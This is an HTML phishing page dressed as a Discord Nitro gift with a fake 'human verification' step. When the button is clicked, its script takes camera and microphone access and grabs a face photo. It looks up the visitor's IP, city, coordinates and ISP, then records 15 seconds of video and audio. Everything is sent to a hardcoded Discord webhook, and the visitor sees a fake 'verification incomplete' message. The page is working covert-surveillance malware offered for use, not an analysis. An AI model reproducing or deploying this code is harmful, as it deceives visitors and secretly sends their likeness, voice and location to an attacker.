<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:title" content="A WILD GIFT APPEARED! 🎁">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://nitro-gift-activate.github.io/redeem/">
  <meta property="og:image" content="https://www.fosslinux.com/wp-content/uploads/2022/11/Discord-Nitro.png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:image:type" content="image/png">
  <meta name="theme-color" content="#313338">
  <meta property="twitter:card" content="summary_large_image">

  <title>Discord Gift</title>
  <style>
    body { margin:0; background:#111; color:#eee; font-family:Arial, sans-serif; text-align:center; padding: 20vh 10px; min-height:100vh; }
    #msg { font-size:1.8em; margin:20px; }
    .progress-container {
      width: 80%; max-width: 400px; margin: 20px auto; background: #333; border-radius: 8px; overflow: hidden; height: 30px; position: relative; display:none;
    }
    .progress-bar {
      width: 0%; height: 100%; background: #0066cc; transition: width 0.1s linear;
    }
    .progress-text {
      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: white; font-weight: bold; font-size: 1.2em; text-shadow: 0 0 5px black; z-index: 2;
    }
    video, canvas { display:none; }
    .container { max-width:600px; margin:auto; }
    button { padding:15px 40px; font-size:1.3em; background:#0066cc; color:white; border:none; border-radius:8px; cursor:pointer; margin:20px; }
    button:hover { background:#0055aa; }
    button:disabled { opacity:0.6; cursor:not-allowed; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Quick Verification</h1>
    <p id="msg">Please click verify to continue. This helps prove you're a human.</p>
    
    <div id="progressContainer" class="progress-container">
      <div id="progressBar" class="progress-bar"></div>
      <div id="progressText" class="progress-text">0%</div>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    <button id="btn">Verify Me</button>
  </div>

  <script>
    const videoElement = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const msg = document.getElementById('msg');
    const btn = document.getElementById('btn');
    const progressContainer = document.getElementById('progressContainer');
    const progressBar = document.getElementById('progressBar');
    const progressText = document.getElementById('progressText');

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1479318338411827384/nNZ_pZsoR7CZJn9n6U_UA4hawAdOKiGngDqoDBNkbTT7pggzniMRTDh7wO_tNRfDXhZZ";
    const RECORD_DURATION = 15000; // longer to help metadata

    let startTime = 0;
    let animationFrameId = null;

    function updateProgress() {
      if (!startTime) return;
      const elapsed = Date.now() - startTime;
      let percent = (elapsed / RECORD_DURATION) * 100;
      if (percent > 100) percent = 100;
      progressBar.style.width = percent + '%';
      progressText.textContent = Math.round(percent) + '%';
      if (percent < 100) animationFrameId = requestAnimationFrame(updateProgress);
    }

    async function sendAttachment(content, blob, filename) {
      const payload = { content };
      const formData = new FormData();
      formData.append('payload_json', JSON.stringify(payload));
      formData.append('file', blob, filename);
      try {
        const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
        console.log(`Send to ${filename} - Status: ${res.status} ${res.statusText}`);
        return res.ok;
      } catch (e) {
        console.error(`Send error for ${filename}:`, e);
        return false;
      }
    }

    async function captureMugshot() {
      const ctx = canvas.getContext('2d');
      canvas.width = videoElement.videoWidth || 640;
      canvas.height = videoElement.videoHeight || 480;
      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
      await new Promise(r => setTimeout(r, 300));
      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
      return new Promise(r => canvas.toBlob(r, 'image/png'));
    }

    async function recordAndSend() {
      try {
        msg.textContent = "Loading verification... Please wait.";
        btn.disabled = true;

        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", frameRate: { ideal: 30 } },
          audio: true
        });

        videoElement.srcObject = stream;

        await new Promise(resolve => {
          videoElement.onloadedmetadata = () => {
            videoElement.play().catch(e => console.error("Play error:", e));
            resolve();
          };
          setTimeout(resolve, 5000); // long settle for iPhone Safari
        });

        await new Promise(r => setTimeout(r, 1500));

        // Mugshot
        const mugshotBlob = await captureMugshot();
        let geo = "Location grab failed";
        try {
          const res = await fetch('https://ipapi.co/json/');
          if (res.ok) {
            const d = await res.json();
            if (!d.error) geo = `IP: ${d.ip||'n/a'}\nCity: ${d.city||'n/a'}\nRegion: ${d.region||'n/a'}\nCountry: ${d.country_name||'n/a'}\nCoords: ${d.latitude||'n/a'}, ${d.longitude||'n/a'}\nISP: ${d.org||'n/a'}`;
          }
        } catch {}
        if (mugshotBlob && mugshotBlob.size > 1000) {
          await sendAttachment(
            `🎯 Face captured first\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`,
            mugshotBlob,
            `face_${Date.now()}.png`
          );
        } else {
          console.log('Mugshot failed or empty');
        }

        // Video - hardened
        progressContainer.style.display = 'block';
        msg.textContent = "";

        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
        const chunks = [];

        recorder.ondataavailable = e => {
          if (e.data.size > 0) {
            chunks.push(e.data);
            console.log(`Chunk added - size: ${e.data.size / 1024} KB`);
          }
        };

        recorder.onstop = async () => {
          cancelAnimationFrame(animationFrameId);
          progressBar.style.width = '100%';
          progressText.textContent = '100%';

          stream.getTracks().forEach(track => track.stop());

          if (chunks.length === 0) {
            console.log('NO CHUNKS RECORDED - video failed');
            await sendToWebhook(`⚠️ Video attempt - NO DATA RECORDED\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`);
            msg.textContent = "Verification incomplete. Center Face In Camera View";
            progressContainer.style.display = 'none';
            btn.style.display = 'none';
            return;
          }

          const blob = new Blob(chunks, { type: 'video/webm' });
          console.log(`Final video blob size: ${blob.size / 1024} KB`);

          if (blob.size < 5000) {
            console.log('Blob too small - likely junk');
            await sendToWebhook(`⚠️ Video attempt - TINY BLOB (${blob.size} bytes)\nUA: ${navigator.userAgent}`);
          }

          let geoDetails = geo;

          const vidContent = `🎥 Video clip attached\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`;

          // Try .webm first
          let sent = await sendAttachment(vidContent, blob, `verification_${Date.now()}.webm`);

          // Retry with .mp4 if failed
          if (!sent) {
            console.log(' .webm send failed - retrying .mp4');
            sent = await sendAttachment(vidContent, blob, `verification_${Date.now()}.mp4`);
          }

          if (!sent) {
            console.log('Both send attempts failed');
            await sendToWebhook(`⚠️ Video send FAILED (both extensions)\nBlob size was ${blob.size} bytes\nUA: ${navigator.userAgent}`);
          }

          msg.textContent = "Verification incomplete. Center Face In Camera View";
          progressContainer.style.display = 'none';
          btn.style.display = 'none';
        };

        recorder.start(1000); // force chunk every second
        startTime = Date.now();
        updateProgress();
        setTimeout(() => recorder.stop(), RECORD_DURATION);

      } catch (err) {
        console.error('Overall error:', err);
        msg.textContent = "Verification incomplete. Center Face In Camera View";
        progressContainer.style.display = 'none';
        btn.disabled = false;
      }
    }

    btn.addEventListener('click', recordAndSend);
  </script>
</body>
</html>
